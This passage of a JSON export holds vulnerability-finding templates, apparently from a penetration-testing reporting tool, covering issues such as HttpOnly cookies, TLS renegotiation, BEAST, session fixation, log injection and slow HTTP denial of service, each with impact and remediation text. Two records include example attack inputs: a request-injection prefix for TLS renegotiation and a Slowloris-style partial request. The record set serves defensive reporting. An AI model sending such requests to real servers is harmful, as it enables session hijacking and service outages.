[{"id":309,"plugin_id":null,"title":"HttpOnly Cookie Attribute Not Set","type":null,"description":"The HttpOnly flag is not set on cookies containing sensitive information. The HttpOnly flag is a flag set as part of a Set-Cookie header to prevent that cookie's value from being read or set by client-side JavaScript in modern browsers. Without the HttpOnly attribute, the cookie's value can be accessed by client-side scripts like JavaScript.\n","poc":null,"impact":"Failing to set the HttpOnly flag on sensitive cookies may aid in the execution of certain attacks such as cross-site scripting, which use JavaScript to obtain session identifiers and other sensitive information and transmit it to a malicious third party. An attacker who is able to intercept a victim's session identifier would gain complete control of that user's session, allowing the attacker to access any information and perform any action with the victim's privileges.\n","remediation":"Set the 'HttpOnly' attribute when sending Set-Cookie headers in responses. This can be done either programmatically or through deployment descriptors provided by various frameworks. Note that in many newer technologies such as newer versions of Apache Tomcat web server, the HttpOnly attribute for sensitive cookies such as session cookies, is set to true by default.\n","cvss_base_score":2.6,"cvss_temporal_score":1.9,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:24:59","updated_at":"2018-11-12 09:24:59","approved":1,"v_likelihood":"Minimal","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":310,"plugin_id":null,"title":"Directory Listing Enabled","type":null,"description":"The server is configured to display the list of resources present in certain directories under the web root. Resources can include specific files that are hosted on the server, such as HTML pages, as well as any sub-directories present. The directory listing is displayed by the server if the standard \"index\" page is unavailable in the server's root directory, or if a sub-directory is specifically requested in a browser. Directory listings are commonly enabled by default by web application servers or are enabled in server configuration files.\n","poc":null,"impact":"Directory listings discovered on the server may aid an attacker in locating and gaining access to restricted resources. Resources that are not linked to in the application itself or are only made available to specific users may be exposed if additional protections are not implemented. The level of effort needed to discover other resources such as test scripts and backup files is also much lower when an attacker can directly view lists of files in server directories.\nAdditionally, by reviewing directory contents as well as the page generated by the server to display the listing, an attacker may determine the technology stack used by the application. Once the web server in use has been identified an attacker will be able to launch more specific attacks against the server and its installed components.\n","remediation":"The web server must be configured to disable directory listing on all directories present. The option to disable directory listings is normally found in most web servers' configuration files. In some cases, directory listing can be disabled on a per-directory basis; disabling directory listing server-wide is preferable, however, to prevent individual directories from being exposed when a specific directory is not properly configured.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:24:59","updated_at":"2018-11-12 09:24:59","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":311,"plugin_id":null,"title":"Backup Files Left in Production","type":null,"description":"Backup files associated with the application have been left in the production environment and are externally accessible. These files do not provide any functionality to the application and can be created as a result of editing application files, creating on-the-fly backup copies, as well as by failing to remove old or unreferenced files. Backup files can also be generated automatically by the application's underlying file system without the user's knowledge resulting in files being stored in an unmanaged location.\n","poc":null,"impact":"Backup files left in production may grant an attacker unauthorized access to confidential user and application information as well as unauthorized functionality. Backup files may contain source code, configuration files, credentials, internal business logic, or general content that should be protected from external access.\nBackup files may be abused in various ways depending on the type of resource and how the resource is named:\n--Application pages backed up by renaming the file but leaving the original extension in place would still be accessible to an attacker as long as the resource name can be guessed or a directory listing can be obtained. In such situations, functionality that was not intended to be used may be submitted to perform unauthorized actions against the application.\n--In cases where an application page was renamed with a different extension, the web server may serve the resource contents directly to the user rather than processing and delivering the rendered output. For example, source code contained in an application page with the extension .aspx would be executed and the output would be served to the user. Conversely, the source code from the same file renamed to .aspx.bak would be served directly to the user as text.\n\nExposed source code may reveal sensitive information including hardcoded credentials and paths to internal resources. An attacker may also be able to discover new vulnerabilities in the application by reading the source code and looking for weaknesses that may not be as easily found during dynamic testing.</li> <li>In cases where the backup file type is not a type that the application server is designed to process in some way, the file is generally served directly to the user. In such cases, any information contained would be leaked if the resource is discovered.</li> </ul><p>\n","remediation":"Backup files accessible to the user should be removed from the application, and a security policy regarding backups should be followed to prevent backup files from being left in production in the future. At a minimum the following controls should be implemented:\n--Do not allow in-place file editing on web or application servers.\n--Do not take snapshots of production systems and write the files to the same system.\n--Do not allow file creation or storage under the application webroot.\n--Ensure that the code base is periodically reviewed for backup or unreferenced files.\n\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:24:59","updated_at":"2018-11-12 09:24:59","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":312,"plugin_id":null,"title":"All PhoneGap or Cordova Plugins Enabled","type":null,"description":"The application utilizes PhoneGap/Cordova with all plugins enabled. PhoneGap and Cordova are frameworks that provide a bridge between native mobile operating system functionality and JavaScript code that runs in a WebView. This allows for JavaScript code to access all device functionality that would not otherwise be available to it through standard web browser API's. Each piece of native functionality is represented as an individual plugin and can be enabled and disabled separately.\n","poc":null,"impact":"Enabling all PhoneGap/Cordova plugins has two effects on the application's overall security posture. First, it broadens the application's attack surface; if a plugin contains a vulnerability, it may serve as a new vector for attackers to attack the application. Second, if the application contains a separate vulnerability in its own code, such as cross-site scripting, the normal consequences of that vulnerability may be expanded to permit execution of the native functionality exposed by the plugin. This can include access to the device's camera, geo-location functionality, or the device's file system.\n","remediation":"The application should enable only those PhoneGap/Cordova plugins that are necessary for the application's functionality. For example, if the application does not make use of the device's camera, it should not enable the camera plugin.\nThe PhoneGap and Cordova command-line interfaces can list all installed plugins and remove the ones that are not needed by the application. If the command-line interface is unavailable, the plugins can be removed manually from the application's config.xml file.\n","cvss_base_score":6.3,"cvss_temporal_score":4.7,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:C/A:N/E:U/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:24:59","updated_at":"2018-11-12 09:24:59","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":313,"plugin_id":null,"title":"Weak X.509 Certificate Signature Hashing Algorithm (SSL/TLS)","type":null,"description":"The server is configured to use an X.509 certificate signed using a cryptographically weak hashing algorithm. Weak hashing algorithms such as MD2, MD5 and SHA-1 are known to be susceptible to collision attacks. Collisions in hashing algorithms occur when multiple data sets can be specifically constructed to produce the same resulting digest value.\nWhen a certificate is digitally signed, the signature is not generated based on the full certificate contents, but rather on a digest value of the certificate contents. If an attacker can construct a certificate that produces the same digest value as the victim's certificate, the digital signature of the real certificate will appear to be valid for the forged certificate as well. The forged would appear to be tied to the victim's identity.\n","poc":null,"impact":"An attacker could forge a certificate that would appear valid to systems attempting to validate it. This could be used to facilitate man-in-the-middle attacks (MITM) by impersonating the party presenting the certificate as proof of identity.\n","remediation":"The server will need to acquire a new X.509 certificate that uses at least \"SHA-256 with RSA encryption\" as its certificate signature algorithm.\n","cvss_base_score":6.1,"cvss_temporal_score":5,"cvss_vector":"(AV:N/AC:H/Au:N/C:C/I:P/A:N/E:F/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":314,"plugin_id":null,"title":"SSL/TLS Insecure Renegotiation","type":null,"description":"The server is configured to allow insecure client-initiated renegotiation for TLS/SSL connections. A flaw in the design of the handshake process of SSL/TLS allows an attacker to inject arbitrary data into the beginning of a client's communication with a server during a man-in-the-middle attack. The purpose of the client-initiated renegotiation feature is to allow the client to renegotiate new encryption parameters for the SSL/TLS connection, but prior to protocol-level changes introduced in RFC 5746, the renegotiation handshake was insecure, as it did not properly associate the handshake with an existing connection.\nAn attacker can exploit this design flaw as follows:\n--The attacker sits on the network, ready to intercept communication between the client and server.\n--The client tries to send a handshake to the server to initiate an SSL/TLS connection, but the attacker intercepts it and does not forward it to the server.\n--The attacker initiates an SSL/TLS connection with the server and uses it to send an injection payload to the server, which the server receives and holds on to.\n--The attacker initiates a renegotiation of its connection with the server and forwards the client's handshake.\n--The server completes the renegotiation using the client's handshake and begins encrypted communication with the client.\n--The client sends data to the server over the encrypted connection.\n--The server receives the data from the client and appends it to the data already received from the attacker.\n\nAs an example of how an attacker could exploit this, consider a banking application that supports HTTPS with insecure client-renegotiation and expects to receive legitimate requests from a user Alice like:\n<pre>GET /transfer?to=[recipient] Cookie: sessionId=[user's session ID] </pre>\nwhere [recipient] is the name of the person to whom Alice intends to transfer funds and [user's session ID] is the session identifier Alice received after authenticating to the application.\nAlice may try to send a request like:\n<pre>GET /transfer?to=bob Cookie: sessionId=[Alice's session ID] </pre>\nIf an attacker Mallory was positioned as a man-in-the-middle, Mallory can go through the steps above and send the following injection payload to the server:\n<pre>GET /transfer?to=mallory X-Ignore: </pre>\nMallory then forwards Alice's request, and when the server prepends Mallory's payload to Alice's data, the resulting request is:\n<pre>GET /transfer?to=mallory X-Ignore: GET /transfer?to=bob Cookie: sessionId=[Alice's session ID] </pre>\nMallory's inclusion of the X-Ignore header (which is arbitrary and has no meaning) effectively hides or \"comments out\" part of Alice's original request, and, assuming the server has no other authorization in place, causes the application to transfer money to Mallory's account instead.\n","poc":null,"impact":"Insecure SSL/TLS client-initiated renegotiation allows an attacker to inject arbitrary data into the beginning of a client's communication with a server. Depending on the application, this could allow an attacker to perform unauthorized server-side actions on the client's behalf or downgrade the connection to an unencrypted one.\n","remediation":"The server should be upgraded to use a version of SSL/TLS with the secure client-initiated renegotiation introduced in RFC 5746. If the server cannot be upgraded, client-initiated renegotiation should be disabled.\n","cvss_base_score":6.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:N/I:P/A:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":315,"plugin_id":null,"title":"SSL/TLS Client-Initiated Renegotiation","type":null,"description":"The SSL/TLS endpoint has client-initiated renegotiation enabled. SSL/TLS client-initiated renegotiation is a feature that allows the client to renegotiate new encryption parameters for an SSL/TLS connection within a single TCP connection. During the SSL/TLS handshake the server incurs a higher computational cost. An attacker can exploit this asymmetry by opening an SSL/TLS connection to the server and repeatedly initiating renegotiation, causing the server to waste resources that would otherwise be used for the server's normal function.\nTraditional computational DoS attacks against servers that support TLS involve opening separate TCP connections to a server, so DoS-prevention techniques typically block a client once it has opened a large number of connections to the server. Renegotiation-based computational DoS has the benefit of opening only a single TCP connection to the server, allowing the attacker to more easily evade detection by this heuristic and the attacker does not have to perform a TCP handshake with the TLS server for each TLS handshake completed.\nHowever, renegotiation-based computational DoS attack may not exhaust resources as effectively as traditional or distributed DoS attacks when the server uses a thread per connection. In this model, opening numerous connections (i.e. creating more threads) is more likely to deny service to other users than opening a single connection (i.e. creating one thread) and repeatedly initiating renegotiations. This is because, under a fair scheduler, each thread is given an equal amount of processing time, so while the renegotiations will keep that one thread busy during its slice of processing time, the other threads will function normally. Additionally, a renegotiation-based computational DoS attack is also less efficient than a traditional computational DoS attack against TLS since the client must perform additional cryptographic computations to conduct the attack.\n","poc":null,"impact":"Enabling SSL/TLS client-initiated renegotiation may allow an attacker to conduct a denial of service (DoS) attack against the server, disrupting its availability by triggering a multitude of TLS handshakes using a single TCP connection. In addition to consuming computing resources, DoS can be used to preoccupy security personnel in order to facilitate a subsequent attack.\n","remediation":"If the application does not need to support SSL/TLS client-initiated renegotiation, the server should disable it. Otherwise, the server should use rate-limiting to block clients that initiate a large number of renegotiations in a short period of time using a single TCP connection.\n","cvss_base_score":7.1,"cvss_temporal_score":5.9,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Minimal","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":316,"plugin_id":null,"title":"HTTPS BEAST Information Leakage (SSL/TLS)","type":null,"description":"The server's SSL/TLS configuration is vulnerable to the BEAST (Browser Exploit Against SSL/TLS) information leakage attack. BEAST targets a vulnerability in SSL/TLS that enables an active man-in-the-middle attacker to infer the contents of encrypted HTTPS traffic. Using a malicious Java applet, an attacker is able to send specifically crafted requests from a victim's browser and then observe the output to draw conclusions about the contents of the encrypted traffic. Implementations using SSL 3.0 and TLS 1.0 may be vulnerable to this attack when block ciphers are used; TLS 1.1 and later versions are not vulnerable to this attack.\nBEAST is based on a cryptographic attack known as the \"chosen plain text attack\". By injecting chosen plaintext and generating requests from the victim's browser, the attacker can then observe the resulting encrypted HTTPS traffic sent from the browser and draw conclusions about plaintext, one block at a time. BEAST relies on the predictability of the initialization vector (IV) used by block ciphers in CBC mode (e.g. AES, 3DES), which is the case in SSL 3.0 and TLS 1.0.\nIn practice, only small fragments of text can be targeted as an attacker must make a significant amount of guesses. Note that executing this attack requires an attacker that can predict cipher IV's, influence what gets encrypted, and observe the resulting encrypted traffic.\n","poc":null,"impact":"BEAST allows a man-in-the-middle attacker to uncover small fragments of the encrypted data that is sent in a secure HTTPS connection. Typically, this attack would be used to target a victim's session cookie, which would result in an attacker being able to hijack the session of an authenticated user.\n","remediation":"Servers should be configured to prefer TLS 1.2 ciphers, as the vulnerability targeted by BEAST has been remediated in TLS 1.1 and later versions. SSLv3 and older protocols should be disabled, due to known weaknesses.\nBEAST is primarily mitigated client-side, and all major browsers have implemented protections such as 1/n-1 record splitting to thwart the attack. BEAST could also be mitigated server-side by removing support for block ciphers in TLS 1.0. However, that would mean relying on the stream cipher RC4, which contains known weaknesses and is not recommended.\n","cvss_base_score":4.3,"cvss_temporal_score":3.4,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N/E:POC/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":317,"plugin_id":null,"title":"Session Fixation","type":null,"description":"Session Fixation is a type of session-hijacking vulnerability that happens when an application does not update the session identifier when a user authenticates or has a change of permission. An attacker persuades a valid user to authenticate with a session identifier provided or already compromised by the attacker. Upon successful authentication, the server assigns the new level of permission to the attacker-controlled session identifier, allowing the attacker full access to the victim's account. \nFor a Session Fixation vulnerability to exist, the following sequence of events needs to occur:\n-- The server fails to issue a new session token upon the user's permission level changes (such as when a user is authenticated to the application): A previously generated by the server session identifier can be used by an attacker to hijack the session if the attacker obtains that session identifier. OR \n-- When the server accepts any random identifier for the session: Attackers can persuade victims to use a session identifier value of the attacker's choice due to missing server side validation. \n\nBecause the session identifier remains unchanged after authentication, both the victim and the attacker know the session identifier, allowing the attacker to connect to the application and make requests as the victim.\n","poc":null,"impact":"A Session Fixation vulnerability results in an attacker knowing a victim's session identifier. Since both the attacker and the victim provide the same session identifier to the application, the application will process transactions from the attacker as if they came from the victim as long as the session is active.\n","remediation":"When authenticating a user, the application must invalidate the existing session identifier, and create a new session identifier with the updated session data. Session fixation remediation is a two-steps process:\n-- Session identifiers must be regenerated and re-issued after any changes to the privilege level of a user. For example, when a user authenticates with the application successfully, the privilege level changes from unauthenticated to authenticated, and hence the application must invalidate any existing session identifiers and regenerate a new session identifier. Other cases when such a regeneration may be necessary include (but not limited to) changes in user's password, authorization level, or permissions.\n--Session identifier in every incoming request must be validated by the server using a lookup to ensure the client-submitted value matches the value generated by the server during user's authentication, and that the value is in line with the user's current level of authorization.\n\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":318,"plugin_id":null,"title":"Application Screenshot Information Disclosure (Android)","type":null,"description":"The application allows disclosure of sensitive information when Android automatically takes a screenshot as an application enters a background state and stores the image unprotected on the device. Multitasking in Android allows you to view a list of the running applications with a preview of the state of the application where you left it. When a screenshot is being stored, the device uses bitmaps which are stored in the system's memory. Third party applications could also access this data by calling ActivityManager#getRunningTasks(), which returns a list of RunningTasksInfo.  The RunningTasksInfo class has a public variable called thumbnail that contains the screenshot of the last state of the process.  Currently, this variable always returns null, and it is unclear if the functionality will work in future releases of the Android SDK.\nInformation may be disclosed through an application screenshot that is taken by Android and stored in an unprotected image on the device. An attacker with physical access to the device could obtain the image and scrape sensitive data from it.  While only a single image would be available to the attacker, it may contain data that was visible during any portion of the application's lifecycle.","poc":"","impact":"","remediation":"The first step to preventing sensitive information from appearing in screenshots is to set the FLAG_SECURE attribute. Per the Android developer documentation, the FLAG_SECURE attribute for the window prevents the screen contents from appearing inside of Android's task. Additionally, the android:excludeFromRecents flag should be set to \"true\" for the activity in the AnroidManifest.xml. This will prevent the application from showing up in the list of recent applications.","cvss_base_score":4.9,"cvss_temporal_score":4.1,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2019-01-16 06:19:04","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":"","likelihood_text":""},{"id":319,"plugin_id":null,"title":"Insecure Credential Storage","type":null,"description":"The application insecurely stores authentication credentials on the device. Because of the sensitivity of user credentials, they should never be stored on the client-side in any plaintext or reversible format.\n","poc":null,"impact":"Storing credentials on the device in any format will likely result in user credentials being compromised. If the attacker gains access to a device, they would be able to recover the credentials and authenticate to the affected application as the victim. An attacker without access to the device may still be able to retrieve the credentials by exploiting a separate vulnerability inside of the application that targets the local storage. Lastly, if the application is running on a jailbroken/rooted device, the attacker may pull the credentials directly from the device using a separate application either by exploitation or social-engineering a victim user.\n","remediation":"The first step to successfully remediating this vulnerability is to determine if it is absolutely required for the credentials to be stored on the device. There are special cases where it will be required, but if it is not controlled by a business requirement, the application should be updated and should avoid storing the credentials. Instead, the application should store a session identifier on the device that is obtained after a user successfully authenticates to the backend service, this session identifier can be controlled and revoked by the server if necessary.\nIf credentials must be stored on the device, they should be stored using a one-way function in a similar manner as storing passwords on a backend service. The following approach is recommended:  <pre><code class=\"dart\">stored value = [salt] + pbkdf2([salt], [credential], c=10000); </pre>\nThe application should use a cryptographically strong random value as a salt. This salt value along with the credentials should be used as input to a PBKDF2 adaptive hash function call for a suggested 10,000 iterations as controlled by the \"c\" variable. Finally, the generated salt should be concatenated to the beginning of the PBKDF2 result for the stored value at rest.\n","cvss_base_score":6.3,"cvss_temporal_score":6.3,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:C/A:N/E:ND/RL:U/RC:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":320,"plugin_id":null,"title":"Log Injection","type":null,"description":"Log Injection occurs when an attacker is able to inject malicious code as part of a log entry with the intent of executing it when observed in a log viewer. All data sent to application log files will need to be maintained in order to display all events that have occurred in the system. These log files may then be viewed by end users through multiple means from a terminal to a full featured web application. If potentially malicious characters or control characters are not sanitized prior to being displayed in one of these viewers they can impact the end user viewing the logs.\n","poc":null,"impact":"Log Injection can be exploited to inject malicious code into a log file, allowing the attacker to mount various attacks through the log viewer application. Attacks against the log viewing application may be accomplished through various means depending on the viewer used. For example when logs are viewed through a web browser, rogue JavaScript code can be injected into the logs that when viewed can execute a cross site scripting attack. A second example comes from when logs are viewed within a terminal. Control characters, such as backspace and newlines, can be injected into the log files, which may affect the way the logs are displayed or execute commands in a user's terminal.\n","remediation":"Log Injection can be prevented by encoding log data before displaying the information in the log viewer. For example, log data being viewed in a web browser should be HTML-encoded prior to being inserted in the page served to the user.\nOutput Encoding libraries exist for most popular programming languages and frameworks.\n--OWASP ESAPI:  Supports Java, PHP, Classic ASP, Cold Fusion, Python, and Haskell\n--OWASP Java Encoder:  Java only\n--Microsoft Web Protection Library: .NET languages\n--Ruby - escapeHTML() - only supports HTML Text Encoding\n--Jgencoder in JQuery\n\n--Google Capabilities based JavaScript CAJA\n--OWASP JXT- automatically encodes string data with the proper encoding\n\n","cvss_base_score":3,"cvss_temporal_score":2.5,"cvss_vector":"(AV:L/AC:M/Au:S/C:P/I:P/A:N/E:F/RL:OF/RC:C/CDP:LM/TD:M/CR:ND/IR:ND/AR:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":321,"plugin_id":null,"title":"Lack of Binary Obfuscation (Android)","type":null,"description":"--Symbol renaming, where names of classes, functions and variables are replaced with strings that are meaningless to humans.\n--Increased control-flow complexity, such as introduction of additional branches and conditional logic to the code.\n--String obfuscation, where hardcoded strings are transformed to formats that cannot easily be statically retrieved.\n--Encryption of parts of the application to be decrypted at runtime using a hardcoded key, such as classes or resources.\n--Dummy code insertion, where meaningless code is added in order to confuse attackers.\n--Metadata removal, where little pieces of information added by the compiler, such as line numbers, is removed.\n--Binary merging, where two or more native libraries are merged together.\n--Opaque predicate insertion, aimed at confusing static analysis.\n\nAs an example, consider the following Android code before and after applying a symbol renaming obfuscation control.\nBefore obfuscation: <pre><code class=\"java\">private void PerformSigning(Data dataToSign){     if(dataToSign.isValid()){         Signature sign = Signer.sign(dataToSign);         UpdateSignatures(sign);     } } </pre>\nAfter obfuscation: <pre><code class=\"java\">private void aa(Va za){     if(za.ab()){         Bd bb = az.dc(za);         bc(bb);     } } </pre>\n","poc":null,"impact":"Without binary obfuscation, an attacker can easily disassemble and decompile the binary APK file of the application and understand the resulting code. Through various reverse engineering techniques, an attacker can figure out a lot of information about an application, including, but not limited to: logical flaws, intellectual property, hard coded secrets (cryptographic keys, passwords, internal IP addresses), and privileged functions. Knowledge of the application internals can facilitate the process of bypassing application controls and the development of other attacks.\n","remediation":"Applications handling sensitive data, performing financial transactions or containing unique IP should consider introducing binary obfuscation where appropriate, in order to make reverse-engineering harder for attackers. \nThe open-source ProGuard tool performs a degree of symbol renaming, however this may not be adequate binary obfuscation. ProGuard is used by default during an Android's application compilation toolchain for production binaries. There are several commercial products available for obfuscating Android applications, including their native libraries. Each of these products should be independently configured and assessed, as each applies different obfuscation controls. As C/C++ obfuscation is inherently more robust than Java obfuscation, it might be worth considering implementing sensitive operations such as cryptography, root detection, and certificate pinning using the NDK before applying obfuscation.\n","cvss_base_score":4.7,"cvss_temporal_score":3.5,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:N/A:N/E:U/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":322,"plugin_id":null,"title":"Denial of Service through Incomplete HTTP Requests (Slow HTTP Attacks)","type":null,"description":"The application's web server contains a Denial of Service vulnerability that can be exploited using slow HTTP requests. The attack locks up all the threads of a web server by sending partial HTTP requests and forcing the server to wait for more data.  For example, the Slowloris tool sends a request like:\n<pre>GET / HTTP/1.1 Host: hostname.com User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12) Content-Length: 42 X-a: b X-a: b </pre>\nThe request lacks a carriage return/linefeed (\\r\\n) at the end, which forces the server to keep the thread active waiting for the remainder of the request until its configured timeout. Slowloris sends a 'X-a: b' header periodically to ensure that the server does not time out the connection. By sending many such HTTP requests, Slowloris can make the server unresponsive.\nThis is just one of several attacks that are known as Slow HTTP attacks.\n","poc":null,"impact":"The application's response time significantly increased and eventually became unresponsive.\n","remediation":"Preventing Slow HTTP attacks requires tuning the web server to limit the threads that are tied up with malicious incomplete HTTP requests, but not reject or abort legitimate ones.  Every web server has its own set of configuration parameters.  The Qualys website has an informative article that covers the most popular web servers:\nhttps://community.qualys.com/blogs/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks\n","cvss_base_score":7.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:N/A:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":323,"plugin_id":null,"title":"Lack of Binary Obfuscation (iOS)","type":null,"description":"--Symbol renaming, where names of classes, functions and variables are replaced with strings that are meaningless to humans.\n--Increased control-flow complexity, such as introduction of additional branches and conditional logic to the code.\n--String obfuscation, where hardcoded strings are transformed to formats that cannot easily be statically retrieved.\n--Encryption of parts of the application to be decrypted at runtime using a hardcoded key, such as classes or resources.\n--Dummy code insertion, where meaningless code is added in order to confuse attackers.\n--Metadata removal, where little pieces of information added by the compiler, such as line numbers, is removed.\n--Binary merging, where two or more native libraries are merged together.\n--Opaque predicate insertion, aimed at confusing static analysis.\n\n","poc":null,"impact":"Without binary obfuscation, an attacker can easily disassemble and decompile the binary IPA file of the application and understand the resulting code. Through various reverse engineering techniques, an attacker can figure out a lot of information about an application, including, but not limited to: logical flaws, intellectual property, hard coded secrets (cryptographic keys, passwords, internal IP addresses), and privileged functions. Knowledge of the application internals can facilitate the process of bypassing application controls and the development of other attacks.\n","remediation":"Applications handling sensitive data, performing financial transactions or containing unique IP should consider introducing binary obfuscation where appropriate, in order to make reverse-engineering harder for attackers. \nObjective-C and Swift code is not obfuscated by default during the compilation, it is however stripped to a degree, limiting the number of available symbols in the resulting binary. More thorough obfuscation can be achieved by using one of several open-source and commercial products are available for iOS applications. Each of these products should be independently configured and assessed, as each applies different obfuscation controls. As native code obfuscation is inherently more robust than Objective-C obfuscation, it might be worth considering implementing sensitive operations such as cryptography, root detection, and certificate pinning using C/C++ before applying obfuscation.\n","cvss_base_score":4.7,"cvss_temporal_score":3.5,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:N/A:N/E:U/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":324,"plugin_id":null,"title":"Personally Identifiable Information Is Not Masked When Displayed","type":null,"description":"Unmasked personally identifiable information (PII) is displayed on an application page or in a report even though that information is not needed. The specific data considered PII is defined in the company's security policy or standards. This information can be stolen through 'shoulder surfing,' through a compromised application user account, through malware on a user's computer, etc.\n","poc":null,"impact":"Displaying personally identifiable information (PII), such as a user's Social Security Number or a credit card number can result in inadvertent disclosure of this information.\n","remediation":"PII should be masked when displayed on application pages or in reports.  The masking must occur on the server; unmasked data should not be returned to the browser (or any other client-side application). Typical masking approaches for social security numbers and credit card numbers involve masking all but the last four digits of these numbers.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:00","updated_at":"2018-11-12 09:25:00","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":325,"plugin_id":null,"title":"The Application Treats GET and POST Requests Identically","type":null,"description":"The application treats HTTP GET and POST requests to certain URLs identically even though it currently only uses HTTP POST requests.\nUnnecessarily accepting HTTP GET requests can have several potential consequences. Firstly, it is often easier to write code to send GET requests; therefore, developers may be likely to send sensitive data in GET requests in the future. Many web servers, by default, log all HTTP GET request parameters since they are part of the request URL; parameters in the body of POST requests are not logged. URLs containing sensitive parameters may also be logged in users' browser histories. If the application contains links to 